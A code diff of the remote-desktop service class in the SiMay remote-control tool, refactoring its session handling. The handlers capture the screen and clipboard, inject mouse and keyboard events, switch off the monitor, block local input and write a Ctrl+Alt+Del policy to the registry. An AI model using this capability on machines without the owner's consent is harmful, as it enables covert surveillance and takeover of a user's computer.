@@ -1,6 +1,5 @@
 ﻿using SiMay.Core;
 using SiMay.ServiceCore.Attributes;
-using SiMay.Sockets.Tcp.Session;
 using System.Drawing;
 using System.Threading;
 using System.Windows.Forms;
@@ -10,11 +9,12 @@ using SiMay.Platform.Windows;
 using static SiMay.Platform.Windows.CommonWin32Api;
 using SiMay.ModelBinder;
 using SiMay.RemoteService.Loader;
+using SiMay.Net.SessionProvider;
 
 namespace SiMay.ServiceCore
 {
     [ServiceName("远程桌面")]
-    [ServiceKey(AppJobConstant.REMOTE_DESKTOP)]
+    [ServiceKey(AppFlageConstant.REMOTE_DESKTOP)]
     public class ScreenService : ApplicationRemoteService
     {
         private int _bscanmode = 1; //0差异 1逐行
@@ -23,9 +23,9 @@ namespace SiMay.ServiceCore
         private bool _hasSystemAuthor = AppConfiguartion.HasSystemAuthority;
         private ScreenSpy _spy;
 
-        public override void SessionInited(TcpSocketSaeaSession session)
+        public override void SessionInited(SessionProviderContext session)
         {
-            CurrentSession.Socket.NoDelay = false;
+            session.CurrentSession.Socket.NoDelay = false;
             _spy = new ScreenSpy(new BitBltCapture(true));
             _spy.OnDifferencesNotice += ScreenDifferences_OnDifferencesNotice;
         }
@@ -37,7 +37,7 @@ namespace SiMay.ServiceCore
         }
 
         [PacketHandler(MessageHead.S_SCREEN_DELETE_WALLPAPER)]
-        public void DeleteWallPaper(TcpSocketSaeaSession session)
+        public void DeleteWallPaper(SessionProviderContext session)
         {
             if (_cleanWallPaper)
                 return;
@@ -51,9 +51,9 @@ namespace SiMay.ServiceCore
 
 
         [PacketHandler(MessageHead.S_SCREEN_SET_CLIPBOARD_TEXT)]
-        public void SetClipoardHandler(TcpSocketSaeaSession session)
+        public void SetClipoardHandler(SessionProviderContext session)
         {
-            var pack = GetMessageEntity<ScreenSetClipoardPack>(session);
+            var pack = session.GetMessageEntity<ScreenSetClipoardPack>();
 
             Thread thread = new Thread(() =>
             {
@@ -65,12 +65,12 @@ namespace SiMay.ServiceCore
 
 
         [PacketHandler(MessageHead.S_SCREEN_GET_CLIPOARD_TEXT)]
-        public void GetClipoardHandler(TcpSocketSaeaSession session)
+        public void GetClipoardHandler(SessionProviderContext session)
         {
             Thread thread = new Thread(() =>
             {
                 var text = Clipboard.GetText();
-                SendTo(CurrentSession, MessageHead.C_SCREEN_CLIPOARD_TEXT,
+                CurrentSession.SendTo(MessageHead.C_SCREEN_CLIPOARD_TEXT,
                     new ScreenClipoardValuePack()
                     {
                         Value = text
@@ -82,12 +82,12 @@ namespace SiMay.ServiceCore
         }
 
         [PacketHandler(MessageHead.S_SCREEN_GET_INIT_BITINFO)]
-        public void SendDesktopBitInfo(TcpSocketSaeaSession session)
+        public void SendDesktopBitInfo(SessionProviderContext session)
             => SendDesktopInitInfo();
 
         private void SendDesktopInitInfo()
         {
-            SendTo(CurrentSession, MessageHead.C_SCREEN_BITINFO,
+            CurrentSession.SendTo(MessageHead.C_SCREEN_BITINFO,
                new ScreenInitBitPack()
                {
                    Height = _spy.ScreenHeight,
@@ -102,9 +102,9 @@ namespace SiMay.ServiceCore
         }
 
         [PacketHandler(MessageHead.S_SCREEN_CHANGE_MONITOR)]
-        public void MonitorChangeHandler(TcpSocketSaeaSession session)
+        public void MonitorChangeHandler(SessionProviderContext session)
         {
-            var currenMonitor = GetMessageEntity<MonitorChangePack>(session).MonitorIndex;
+            var currenMonitor = session.GetMessageEntity<MonitorChangePack>().MonitorIndex;
             _spy.Capturer.SelectedScreen = currenMonitor;
         }
 
@@ -113,7 +113,7 @@ namespace SiMay.ServiceCore
             switch (nCode)
             {
                 case DifferStatus.FULL_DIFFERENCES:
-                    SendTo(CurrentSession, MessageHead.C_SCREEN_DIFFBITMAP,
+                    CurrentSession.SendTo(MessageHead.C_SCREEN_DIFFBITMAP,
                         new ScreenFragmentPack()
                         {
                             Fragments = fragments
@@ -121,7 +121,7 @@ namespace SiMay.ServiceCore
                     break;
 
                 case DifferStatus.NEXT_SCREEN:
-                    SendTo(CurrentSession, MessageHead.C_SCREEN_BITMP,
+                    CurrentSession.SendTo(MessageHead.C_SCREEN_BITMP,
                         new ScreenFragmentPack()
                         {
                             Fragments = fragments
@@ -129,14 +129,14 @@ namespace SiMay.ServiceCore
                     break;
 
                 case DifferStatus.COMPLETED:
-                    SendTo(CurrentSession, MessageHead.C_SCREEN_SCANCOMPLETE);
+                    CurrentSession.SendTo(MessageHead.C_SCREEN_SCANCOMPLETE);
                     break;
             }
         }
         [PacketHandler(MessageHead.S_SCREEN_NEXT_SCREENBITMP)]
-        public void SendNextScreen(TcpSocketSaeaSession session)
+        public void SendNextScreen(SessionProviderContext session)
         {
-            var rect = GetMessageEntity<ScreenHotRectanglePack>(session);
+            var rect = session.GetMessageEntity<ScreenHotRectanglePack>();
             //根据监控模式使用热区域扫描
             bool ishotRegtionScan = false;// rect.CtrlMode == 1 ? true : false;
 
@@ -150,7 +150,7 @@ namespace SiMay.ServiceCore
         }
 
         [PacketHandler(MessageHead.S_SCREEN_CTRL_ALT_DEL)]
-        public void CtrlAltDelHandler(TcpSocketSaeaSession session)
+        public void CtrlAltDelHandler(SessionProviderContext session)
         {
             var registryKey = RegistryEditor.GetWritableRegistryKey(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
             registryKey.SetValue("SoftwareSASGeneration", 00000003, Microsoft.Win32.RegistryValueKind.DWord);
@@ -162,43 +162,43 @@ namespace SiMay.ServiceCore
         }
 
         [PacketHandler(MessageHead.S_SCREEN_CHANGESCANMODE)]
-        public void ChangeSpyScanMode(TcpSocketSaeaSession session)
+        public void ChangeSpyScanMode(SessionProviderContext session)
         {
-            _bscanmode = GetMessage(session)[0];
+            _bscanmode = session.GetMessage()[0];
         }
 
         [PacketHandler(MessageHead.S_SCREEN_SETQTY)]
-        public void SetImageQuality(TcpSocketSaeaSession session)
+        public void SetImageQuality(SessionProviderContext session)
         {
-            var pack = GetMessageEntity<ScreenSetQtyPack>(session);
+            var pack = session.GetMessageEntity<ScreenSetQtyPack>();
             _spy.SetImageQuality = pack.Quality;
         }
 
         [PacketHandler(MessageHead.S_SCREEN_RESET)]
-        public void SetSpyFormat(TcpSocketSaeaSession session)
+        public void SetSpyFormat(SessionProviderContext session)
         {
-            _spy.SetFormat = GetMessage(session)[0];
+            _spy.SetFormat = session.GetMessage()[0];
         }
 
         [PacketHandler(MessageHead.S_SCREEN_BLACKSCREEN)]
-        public void SetScreenBlack(TcpSocketSaeaSession session)
+        public void SetScreenBlack(SessionProviderContext session)
         {
             SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
         }
 
         [PacketHandler(MessageHead.S_SCREEN_MOUSEBLOCK)]
-        public void SetMouseBlock(TcpSocketSaeaSession session)
+        public void SetMouseBlock(SessionProviderContext session)
         {
-            if (GetMessage(session)[0] == 10)
+            if (session.GetMessage()[0] == 10)
                 BlockInput(true);
             else
                 BlockInput(false);
         }
 
         [PacketHandler(MessageHead.S_SCREEN_MOUSEKEYEVENT)]
-        public void MouseKeyEvent(TcpSocketSaeaSession session)
+        public void MouseKeyEvent(SessionProviderContext session)
         {
-            var @event = GetMessageEntity<ScreenKeyPack>(session);
+            var @event = session.GetMessageEntity<ScreenKeyPack>();
             Screen[] allScreens = Screen.AllScreens;
             int offsetX = allScreens[_spy.Capturer.SelectedScreen].Bounds.X;
             int offsetY = allScreens[_spy.Capturer.SelectedScreen].Bounds.Y;
